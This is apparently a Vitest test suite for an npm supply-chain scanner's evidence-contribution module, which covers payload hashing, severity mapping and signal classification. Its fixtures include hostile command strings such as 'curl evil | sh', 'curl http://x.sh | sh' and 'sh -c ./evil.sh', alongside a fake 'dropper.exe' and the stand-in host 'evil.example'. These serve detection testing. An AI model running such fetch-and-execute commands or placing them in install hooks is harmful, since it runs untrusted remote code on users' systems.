import { describe, it, expect, vi, afterEach } from 'vitest'
import { createHash } from 'node:crypto'
import type { Finding } from '../../../src/scanner/rules'
import type { TarballScanResult } from '../../../src/scanner/intel/deep-dependency'
import type { DependencyDelta } from '../../../src/scanner/intel/types'
import { sha512Hex } from '../../../src/scanner/intel/content-intel/identity'
import {
  buildContributePayload,
  serializeScanEvidence,
  findingToContributeItem,
  truncateUtf8,
  normalizeSignals,
  signalSetFromScan,
  identityFromManifest,
  MAX_MANIFEST_BYTES,
  MAX_ITEMS_PER_LIST,
  CONTRIBUTE_SIGNALS,
} from '../../../src/scanner/intel/cloud-contribute'

afterEach(() => {
  vi.unstubAllEnvs()
})

function manifestJson(): string {
  return JSON.stringify({ name: 'evildep', version: '1.0.0', scripts: { preinstall: 'node setup.mjs' } })
}

describe('buildContributePayload', () => {
  it('derives contentId as sha512:<sha512 hex of the manifest utf8 bytes>', () => {
    const manifest = manifestJson()
    const payload = buildContributePayload({ manifest, state: 'SUSPICIOUS', risk: 'high', alerts: [], deltas: [] })
    expect(payload.contentId).toBe('sha512:' + sha512Hex(Buffer.from(manifest, 'utf8')))
    expect(payload.contentId).toMatch(/^sha512:[0-9a-f]{128}$/)
  })

  it('computes manifestHash as sha256(JSON.stringify({alerts,deltas})) hex truncated to 24 chars', () => {
    const alerts = [
      { type: 'supply_chain', severity: 'CRITICAL' as const, riskLevel: 9, message: 'Dangerous lifecycle script', category: 'supply_chain' },
    ]
    const deltas = [
      { type: 'network', severity: 'MEDIUM' as const, riskLevel: 5, message: 'New network endpoint: evil.example', evidence: 'evil.example', category: 'supply_chain' },
    ]
    const payload = buildContributePayload({ manifest: manifestJson(), state: 'MALICIOUS', risk: 'critical', alerts, deltas })
    const expected = createHash('sha256').update(JSON.stringify({ alerts, deltas })).digest('hex').slice(0, 24)
    expect(payload.evidence.manifestHash).toBe(expected)
    expect(payload.evidence.manifestHash).toMatch(/^[0-9a-f]{24}$/)
  })

  it('caps alerts and deltas at 100 items each and hashes the capped lists', () => {
    const alerts = Array.from({ length: 150 }, (_, i) => ({
      type: 'code',
      severity: 'INFO' as const,
      riskLevel: 1,
      message: `finding ${i}`,
      category: 'code',
    }))
    const deltas = Array.from({ length: 150 }, (_, i) => ({
      type: 'network',
      severity: 'MEDIUM' as const,
      riskLevel: 5,
      message: `delta ${i}`,
      category: 'supply_chain',
    }))
    const payload = buildContributePayload({ manifest: manifestJson(), state: 'KNOWN_SAFE', risk: 'low', alerts, deltas })
    expect(payload.evidence.alerts).toHaveLength(MAX_ITEMS_PER_LIST)
    expect(payload.evidence.deltas).toHaveLength(MAX_ITEMS_PER_LIST)
    const expected = createHash('sha256')
      .update(JSON.stringify({ alerts: alerts.slice(0, MAX_ITEMS_PER_LIST), deltas: deltas.slice(0, MAX_ITEMS_PER_LIST) }))
      .digest('hex')
      .slice(0, 24)
    expect(payload.evidence.manifestHash).toBe(expected)
  })

  it('caps the manifest at 262144 bytes and derives contentId from the capped text', () => {
    const big = 'x'.repeat(MAX_MANIFEST_BYTES + 5000)
    const payload = buildContributePayload({ manifest: big, state: 'KNOWN_SAFE', risk: 'low', alerts: [], deltas: [] })
    expect(Buffer.byteLength(payload.manifest, 'utf8')).toBeLessThanOrEqual(MAX_MANIFEST_BYTES)
    expect(payload.contentId).toBe('sha512:' + sha512Hex(Buffer.from(payload.manifest, 'utf8')))
  })

  it('normalizes scannerVersion to at most 64 chars and defaults to dev', () => {
    expect(buildContributePayload({ manifest: '{}', state: 'KNOWN_SAFE', risk: 'low', alerts: [], deltas: [], scannerVersion: '' }).scannerVersion).toBe('dev')
    const long = 'v'.repeat(100)
    expect(buildContributePayload({ manifest: '{}', state: 'KNOWN_SAFE', risk: 'low', alerts: [], deltas: [], scannerVersion: long }).scannerVersion).toHaveLength(64)
  })

  it('keeps a valid multi-byte manifest intact and truncates to a whole-character prefix', () => {
    const snowman = '☃'.repeat(100)
    expect(truncateUtf8(snowman, 10)).toBe('☃'.repeat(3))
    const payload = buildContributePayload({ manifest: snowman, state: 'KNOWN_SAFE', risk: 'low', alerts: [], deltas: [] })
    expect(payload.manifest).toBe(snowman)
  })
})

describe('findingToContributeItem', () => {
  it('maps finding severity to the contract severity vocabulary', () => {
    const f: Finding = { severity: 'critical', category: 'supply_chain', title: 'x', description: 'd' }
    expect(findingToContributeItem(f)).toMatchObject({ severity: 'CRITICAL', riskLevel: 9, type: 'supply_chain', message: 'x', evidence: 'd', category: 'supply_chain' })
    expect(findingToContributeItem({ ...f, severity: 'high' }).severity).toBe('HIGH')
    expect(findingToContributeItem({ ...f, severity: 'medium' }).severity).toBe('MEDIUM')
    expect(findingToContributeItem({ ...f, severity: 'low' }).severity).toBe('INFO')
  })

  it('keeps the code snippet in evidence when present', () => {
    const f: Finding = { severity: 'high', category: 'supply_chain', title: 'x', description: 'desc', code: 'curl evil | sh' }
    expect(findingToContributeItem(f).evidence).toContain('curl evil | sh')
  })
})

function sampleScan(overrides: Partial<TarballScanResult> = {}): TarballScanResult {
  return {
    resolvedVersion: '1.0.0',
    contentId: 'sha512:' + 'a'.repeat(128),
    integrityVerified: true,
    delta: {
      packageName: 'evildep',
      fromVersion: '',
      toVersion: '1.0.0',
      filesChanged: 3,
      newDomains: ['evil.example'],
      newNetworkCalls: 1,
      newDependencies: [],
      newCapabilities: ['Shell'],
      newScripts: ['postinstall.js'],
      newBinaries: ['dropper.exe'],
      risk: 'critical',
      summary: 'scan summary',
    },
    files: new Map([['package.json', manifestJson()]]),
    lifecycleScripts: [{ script: 'preinstall', command: 'node setup.mjs', dangerous: true }],
    ...overrides,
  }
}

describe('serializeScanEvidence', () => {
  it('returns null when there is no delta', () => {
    expect(serializeScanEvidence({ ...sampleScan(), delta: undefined }, [])).toBeNull()
  })

  it('returns null when the tarball carried no package.json manifest', () => {
    const scan = sampleScan({ files: new Map([['index.js', 'x']]) })
    expect(serializeScanEvidence(scan, [])).toBeNull()
  })

  it('maps the delta risk to a contract state (critical → MALICIOUS)', () => {
    const out = serializeScanEvidence(sampleScan(), [])!
    expect(out.state).toBe('MALICIOUS')
    expect(out.risk).toBe('critical')
    expect(out.manifest).toBe(manifestJson())
  })

  it('serializes the new-capability/domain/script/binary signal set as deltas', () => {
    const out = serializeScanEvidence(sampleScan(), [])!
    const types = out.deltas.map(d => d.type)
    expect(types).toEqual(expect.arrayContaining(['capability', 'network', 'install_script', 'binary']))
    const shell = out.deltas.find(d => d.message.includes('Shell'))
    expect(shell).toMatchObject({ severity: 'CRITICAL', riskLevel: 9, category: 'supply_chain' })
    const script = out.deltas.find(d => d.type === 'install_script')
    expect(script?.script).toBe('postinstall.js')
  })

  it('adds a files-changed info delta when the delta is otherwise clean', () => {
    const scan = sampleScan({
      delta: {
        packageName: 'cleanpkg',
        fromVersion: '',
        toVersion: '1.0.0',
        filesChanged: 12,
        newDomains: [],
        newNetworkCalls: 0,
        newDependencies: [],
        newCapabilities: [],
        newScripts: [],
        newBinaries: [],
        risk: 'low',
        summary: 'clean',
      },
    })
    const out = serializeScanEvidence(scan, [])!
    expect(out.state).toBe('KNOWN_SAFE')
    expect(out.deltas).toEqual([
      expect.objectContaining({ type: 'files_changed', severity: 'INFO', message: '12 files in package' }),
    ])
    expect(out.alerts).toHaveLength(0)
  })

  it('serializes typed findings as alerts', () => {
    const findings: Finding[] = [
      { severity: 'critical', category: 'supply_chain', title: 'Dangerous lifecycle script', description: 'd' },
      { severity: 'medium', category: 'supply_chain', title: 'Network endpoints', description: 'd' },
    ]
    const out = serializeScanEvidence(sampleScan(), findings)!
    expect(out.alerts).toHaveLength(2)
    expect(out.alerts[0]).toMatchObject({ severity: 'CRITICAL', type: 'supply_chain' })
  })
})

describe('normalizeSignals (N3.2 closed enum)', () => {
  it('accepts only values of the closed enum and emits them in stable enum order', () => {
    expect(normalizeSignals(['binary', 'network', 'install_script'])).toEqual(['install_script', 'network', 'binary'])
  })

  it('drops unknown values, dedupes, and never exceeds 32 entries', () => {
    const out = normalizeSignals([...CONTRIBUTE_SIGNALS, ...CONTRIBUTE_SIGNALS, 'not_a_signal', 'shell', 'eval'])
    expect(out).toEqual([...CONTRIBUTE_SIGNALS])
    expect(out.length).toBeLessThanOrEqual(32)
    expect(new Set(out).size).toBe(out.length)
    expect(out).toEqual(expect.arrayContaining([...CONTRIBUTE_SIGNALS]))
  })

  it('returns an empty array for garbage or empty input', () => {
    expect(normalizeSignals(['bogus', 'x'])).toEqual([])
    expect(normalizeSignals([])).toEqual([])
  })
})

describe('signalSetFromScan (Oracle signal → N3.2 enum mapping)', () => {
  function delta(partial: Partial<DependencyDelta>): DependencyDelta {
    return {
      packageName: 'p',
      fromVersion: '',
      toVersion: '1.0.0',
      filesChanged: 0,
      newDomains: [],
      newNetworkCalls: 0,
      newDependencies: [],
      newCapabilities: [],
      newScripts: [],
      newBinaries: [],
      risk: 'low',
      summary: 's',
      ...partial,
    }
  }
  const hook = (over: Partial<{ script: string; command: string; dangerous: boolean }>) => ({
    script: 'postinstall',
    command: '',
    dangerous: false,
    ...over,
  })
  const finding = (title: string, category: Finding['category'] = 'code'): Finding => ({
    severity: 'medium',
    category,
    title,
    description: 'd',
  })

  it('maps each closed-enum value from the right Oracle signal', () => {
    expect(signalSetFromScan(delta({ newCapabilities: ['Shell'] }), [], [])).toEqual(['child_process'])
    expect(signalSetFromScan(delta({ newCapabilities: ['Dynamic Code'] }), [], [])).toEqual(['runtime_execution'])
    expect(signalSetFromScan(delta({ newCapabilities: ['Network'] }), [], [])).toEqual(['network'])
    expect(signalSetFromScan(delta({ newCapabilities: ['Filesystem'] }), [], [])).toEqual(['filesystem'])
    expect(signalSetFromScan(delta({ newDomains: ['evil.example'] }), [], [])).toEqual(['network'])
    expect(signalSetFromScan(delta({ newScripts: ['postinstall.js'] }), [], [])).toEqual(['install_script'])
    expect(signalSetFromScan(delta({ newBinaries: ['dropper.exe'] }), [], [])).toEqual(['binary'])
    expect(signalSetFromScan(undefined, [hook({ command: 'curl http://x.sh | sh', dangerous: true })], [])).toEqual(['install_script', 'download'])
    expect(signalSetFromScan(undefined, [hook({ command: 'sh -c ./evil.sh', dangerous: true })], [])).toEqual(['install_script', 'runtime_execution'])
    expect(signalSetFromScan(undefined, [hook({ command: 'node setup.mjs', dangerous: true })], [])).toEqual(['install_script', 'runtime_execution'])
    expect(signalSetFromScan(undefined, [], [finding('Hardcoded secret detected', 'secret')])).toEqual(['credential_access'])
    expect(signalSetFromScan(undefined, [], [finding('Base64-decoded payload')])).toEqual(['encoded_payload'])
    expect(signalSetFromScan(undefined, [], [finding('Hex-encoded obfuscation')])).toEqual(['obfuscation'])
    expect(signalSetFromScan(undefined, [], [finding('Obfuscated JavaScript (array-based string mapping)')])).toEqual(['obfuscation'])
    expect(signalSetFromScan(undefined, [], [finding('Outbound network request')])).toEqual(['network'])
    expect(signalSetFromScan(undefined, [], [finding('OS command execution detected')])).toEqual(['child_process'])
    expect(signalSetFromScan(undefined, [], [finding('File system access')])).toEqual(['filesystem'])
    expect(signalSetFromScan(undefined, [], [finding('Unsafe eval() detected')])).toEqual(['runtime_execution'])
    expect(signalSetFromScan(undefined, [], [finding('Dynamic Function constructor')])).toEqual(['runtime_execution'])
    expect(signalSetFromScan(undefined, [], [finding('setTimeout with string argument')])).toEqual(['runtime_execution'])
    expect(signalSetFromScan(undefined, [], [finding('Dynamic require() detected')])).toEqual(['runtime_execution'])
  })

  it('dedupes overlapping sources into a single enum entry', () => {
    const out = signalSetFromScan(
      delta({ newCapabilities: ['Shell'], newDomains: ['evil.example'] }),
      [hook({ command: 'node setup.mjs', dangerous: true })],
      [finding('OS command execution detected'), finding('Outbound network request')],
    )
    expect(out).toEqual(['install_script', 'network', 'child_process', 'runtime_execution'])
    expect(new Set(out).size).toBe(out.length)
  })

  it('stays conservative: ambiguous signals are deliberately omitted', () => {
    expect(signalSetFromScan(delta({ newCapabilities: ['Crypto'] }), [], [])).toEqual([])
    expect(signalSetFromScan(delta({ newCapabilities: ['Shell'], newDomains: ['cdn.example'] }), [], [])).not.toContain('suspicious_url')
    expect(signalSetFromScan(undefined, [hook({ command: 'echo hi', dangerous: false })], [])).toEqual(['install_script'])
    expect(signalSetFromScan(undefined, [], [finding('Suspicious module import: net')])).toEqual([])
    expect(signalSetFromScan(undefined, [], [finding('Large file added', 'config')])).toEqual([])
    expect(signalSetFromScan(undefined, [], [finding('Environment file committed', 'config')])).toEqual([])
    expect(signalSetFromScan(undefined, [], [finding('Binary file added', 'dependency')])).toEqual([])
  })
})

describe('identityFromManifest (N3.2 dependency identity)', () => {
  it('extracts name/version from the tarball package.json and fixes ecosystem to npm', () => {
    expect(identityFromManifest(JSON.stringify({ name: 'evildep', version: '1.2.3' }))).toEqual({
      ecosystem: 'npm',
      package: 'evildep',
      version: '1.2.3',
    })
  })

  it('omits version when absent and trims whitespace from name/version', () => {
    expect(identityFromManifest(JSON.stringify({ name: '  pkg  ' }))).toEqual({ ecosystem: 'npm', package: 'pkg' })
    expect(identityFromManifest(JSON.stringify({ name: 'pkg', version: ' ' }))).toEqual({ ecosystem: 'npm', package: 'pkg' })
  })

  it('includes packageHash (the tarball SRI sha512) only when a stable hash exists', () => {
    expect(identityFromManifest(JSON.stringify({ name: 'pkg' }), 'sha512:' + 'a'.repeat(128))).toEqual({
      ecosystem: 'npm',
      package: 'pkg',
      packageHash: 'sha512:' + 'a'.repeat(128),
    })
    expect(identityFromManifest(JSON.stringify({ name: 'pkg' }), '')).not.toHaveProperty('packageHash')
    expect(identityFromManifest(JSON.stringify({ name: 'pkg' }))).not.toHaveProperty('packageHash')
  })

  it('returns undefined when the manifest is missing, malformed, or name is unusable', () => {
    expect(identityFromManifest(undefined)).toBeUndefined()
    expect(identityFromManifest(null)).toBeUndefined()
    expect(identityFromManifest('')).toBeUndefined()
    expect(identityFromManifest('not-json')).toBeUndefined()
    expect(identityFromManifest(JSON.stringify({ version: '1.0.0' }))).toBeUndefined()
    expect(identityFromManifest(JSON.stringify({ name: 42 }))).toBeUndefined()
    expect(identityFromManifest(JSON.stringify({ name: '   ' }))).toBeUndefined()
    expect(identityFromManifest(JSON.stringify({ name: 'x'.repeat(129) }))).toBeUndefined()
  })
})

describe('N3.2 payload integration', () => {
  const alerts = [{ type: 'supply_chain', severity: 'CRITICAL' as const, riskLevel: 9, message: 'x', category: 'supply_chain' }]
  const deltas = [{ type: 'network', severity: 'MEDIUM' as const, riskLevel: 5, message: 'New network endpoint: evil.example', evidence: 'evil.example', category: 'supply_chain' }]
  const identity = { ecosystem: 'npm' as const, package: 'evildep', version: '1.0.0' }

  it('attaches signals and identity only when present, and never changes manifestHash', () => {
    const base = buildContributePayload({ manifest: manifestJson(), state: 'MALICIOUS', risk: 'critical', alerts, deltas })
    expect(base.evidence.signals).toBeUndefined()
    expect(base.identity).toBeUndefined()
    const withExtras = buildContributePayload({
      manifest: manifestJson(),
      state: 'MALICIOUS',
      risk: 'critical',
      alerts,
      deltas,
      signals: ['install_script', 'network', 'binary'],
      identity,
    })
    expect(withExtras.evidence.signals).toEqual(['install_script', 'network', 'binary'])
    expect(withExtras.identity).toEqual(identity)
    expect(withExtras.evidence.manifestHash).toBe(base.evidence.manifestHash)
    expect(withExtras.evidence.manifestHash).toBe(
      createHash('sha256').update(JSON.stringify({ alerts, deltas })).digest('hex').slice(0, 24),
    )
  })

  it('normalizes out-of-order or unknown signals before sending', () => {
    const payload = buildContributePayload({
      manifest: manifestJson(),
      state: 'MALICIOUS',
      risk: 'critical',
      alerts,
      deltas,
      signals: ['binary', 'nope', 'network', 'install_script', 'network'],
    })
    expect(payload.evidence.signals).toEqual(['install_script', 'network', 'binary'])
  })

  it('serializes the full fresh-scan evidence with signals and identity', () => {
    const out = serializeScanEvidence(sampleScan(), [])!
    expect(out.signals).toEqual(['install_script', 'network', 'child_process', 'runtime_execution', 'binary'])
    expect(out.identity).toEqual({
      ecosystem: 'npm',
      package: 'evildep',
      version: '1.0.0',
      packageHash: 'sha512:' + 'a'.repeat(128),
    })
    expect(buildContributePayload(out).evidence.signals).toEqual(out.signals)
    expect(buildContributePayload(out).identity).toEqual(out.identity)
  })

  it('omits signals for a clean scan with no signal sources; identity carries no packageHash when no SRI exists', () => {
    const scan = sampleScan({
      contentId: undefined,
      files: new Map([['package.json', JSON.stringify({ name: 'cleanpkg', version: '1.0.0' })]]) as Map<string, string>,
      delta: {
        packageName: 'cleanpkg',
        fromVersion: '',
        toVersion: '1.0.0',
        filesChanged: 2,
        newDomains: [],
        newNetworkCalls: 0,
        newDependencies: [],
        newCapabilities: [],
        newScripts: [],
        newBinaries: [],
        risk: 'low',
        summary: 'clean',
      },
      lifecycleScripts: [],
    })
    const out = serializeScanEvidence(scan, [])!
    expect(out.signals).toBeUndefined()
    expect(out.identity).toEqual({ ecosystem: 'npm', package: 'cleanpkg', version: '1.0.0' })
    const payload = buildContributePayload(out)
    expect(payload.evidence.signals).toBeUndefined()
    expect(payload.identity).toEqual(out.identity)
  })

  it('omits identity when the manifest carries no package name, even with signals', () => {
    const scan = sampleScan({
      files: new Map([['package.json', JSON.stringify({ version: '1.0.0' })]]) as Map<string, string>,
    })
    const out = serializeScanEvidence(scan, [])!
    expect(out.signals).toEqual(['install_script', 'network', 'child_process', 'runtime_execution', 'binary'])
    expect(out.identity).toBeUndefined()
    expect(buildContributePayload(out).identity).toBeUndefined()
  })
})
